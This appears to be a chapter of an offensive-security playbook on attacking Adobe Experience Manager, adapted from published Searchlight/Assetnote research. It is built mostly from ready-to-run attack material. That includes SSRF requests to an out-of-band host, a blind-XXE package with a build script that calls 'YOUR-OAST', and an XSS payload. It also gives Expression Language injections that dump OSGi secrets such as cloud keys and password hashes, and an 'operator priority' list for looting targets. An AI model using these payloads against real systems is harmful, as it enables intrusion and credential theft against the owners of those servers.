# 9 — Modern AEM bugs (Assetnote / Searchlight 2025)

Source:  
https://slcyber.io/research-center/finding-critical-bugs-in-adobe-experience-manager/  
Authors: Adam Kues, Dylan Pindur (Assetnote / Searchlight).  
Tool: **hopgoblin** (auto checks + path mutations).

Many issues need **auth** or were **hotfixed** (GRANITE-61551, 2025-09).  
Still useful: patterns + residual misconfigs + **dispatcher bypasses Adobe considers “not a security boundary.”**

---

## Kid-level story

1. Bypass the bouncer (you already practiced in 04).  
2. Hit rare servlets that **fetch URLs**, **parse XML**, or **write nodes**.  
3. Chain write → render internal JSP → XSS / Expression Language leak of **in-memory secrets**.

---

## A — SSRF (AccessTokenServlet)

**Endpoint shape:**

```http
POST /services/accesstoken/verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

auth_url=http://YOUR-COLLABORATOR.example
```

```bash
T="https://TARGET"
COLLAB="http://YOUR-OAST"

curl -sk -X POST "$T/services/accesstoken/verify" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "auth_url=$COLLAB"
```

**Why:** Server requests `auth_url` and can return body → full-read SSRF when reachable (auth may be required depending on deploy/patch).

Try with dispatcher bypasses if plain path 404s.

---

## B — Blind XXE (package manager privileges.xml)

**Idea:** Upload a “package” zip.  
Even when install fails (no write to `/apps`), validation still parses XML.  
`META-INF/vault/privileges.xml` used an unsafe parser → **blind XXE**.

### Minimal evil package layout

```text
jcr_root/empty.txt          # empty file
META-INF/vault/privileges.xml
```

**privileges.xml** (OOB):

```xml
<!DOCTYPE x [<!ENTITY foo SYSTEM "https://YOUR-OAST/xxe">]><x>&foo;</x>
```

```bash
mkdir -p /tmp/evilpkg/jcr_root /tmp/evilpkg/META-INF/vault
echo -n > /tmp/evilpkg/jcr_root/empty.txt
cat > /tmp/evilpkg/META-INF/vault/privileges.xml <<'EOF'
<!DOCTYPE x [<!ENTITY foo SYSTEM "https://YOUR-OAST/xxe">]><x>&foo;</x>
EOF
cd /tmp/evilpkg && zip -r ../evil.zip jcr_root META-INF
```

Upload via package manager UI/API if reachable:

```text
/crx/packmgr/index.jsp
/crx/packmgr/service/exec.json
```

**Limits (research):** often blind; modern Java weak for multi-line file exfil; single-line files more realistic.

---

## C — Pre-auth / low-priv node write → cloudsettings pivot

Research found **BulkImportConfigServlet** creating nodes under:

```text
/conf/global/settings/dam/import/...
```

using a **service user** (more power than anonymous).

Then **ConfDeliveryServlet** at patterns like:

```text
/etc/cloudsettings.kernel.html/<path-to-node>
```

forwards to the node’s `sling:resourceType` — i.e. **run almost any JSP/HTL you point at**.

### High-level chain

```text
1) POST /cloudsettings.bulkimportConfig.json
   importSource=UrlBased
   sling:resourceType=/libs/.../something.jsp
   (+ extra props)

2) GET /etc/cloudsettings.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content
```

**Limitation:** special name `cloudsettings`; temp area cleaned every few hours → limited shots/day.

### XSS example pattern (historical)

```http
POST /cloudsettings.bulkimportConfig.json
Content-Type: application/x-www-form-urlencoded

importSource=UrlBased&sling:resourceType=/libs/wcm/foundation/components/page/experienceinfo.json.html&jcr:title=<svg onload=alert(1)>
```

Then open ConfDeliveryServlet URL for that node.

---

## D — Expression Language injection → config leak

Same write gadget, point `sling:resourceType` at translationpage JSP that evals `action` property:

```text
/libs/cq/gui/components/projects/admin/actions/view/translationpage/translationpage.jsp
```

```http
POST /cloudsettings.bulkimportConfig.json
Content-Type: application/x-www-form-urlencoded

importSource=UrlBased&sling:resourceType=/libs/cq/gui/components/projects/admin/actions/view/translationpage/translationpage.jsp&action=${7*7}
```

Expect `data-action="49"`.

### Secret sauce: dump OSGi properties via pageContext

Research payload family:

```text
#{pageContext.class.classLoader.bundle.bundleContext.bundles[0].registeredServices[0].properties}
```

Failed indexes become blank → spray many indexes in one payload → leak:

- Cloud keys (AWS/Azure)  
- API keys  
- Web console password hashes  
- Other service config  

**Impact:** often credential theft; sometimes path to OSGi console / RCE if password reused.

---

## E — hopgoblin (do the boring checks fast)

From the research post:

```bash
# concept — install/run per upstream README when available
python hopgoblin.py https://TARGET
python hopgoblin.py -f targets.txt --threads 25 --ssrf-target YOUR-OAST
```

Checks include:

- QueryBuilder exposure (+ mutations)  
- User/password/writable node queries  
- SSRF accesstoken  
- Blind XXE packmgr  
- EL / cloudsettings paths  

---

## CVEs named in that research wave

CVE-2025-54251, 54249, 54252, 54250, 54247, 54248, 54246  
(plus Forms CVEs in file 08)

**Always** re-check patch level / Adobe advisories before claiming 0-day.

---

## Operator priority

```text
If unauth:
  1) Dispatcher bypass → QueryBuilder loot (highest ROI)
  2) SSRF/XXE if endpoints open
  3) cloudsettings only if write endpoint open

If low-auth author user:
  Same chain with more paths; packages; XSS in author
```

---

## Done when

- [ ] Ran modern endpoint probes (or hopgoblin)  
- [ ] Noted patch likelihood  
- [ ] Looted configs if EL/write worked  

**Next:** [10-playbooks.md](./10-playbooks.md)
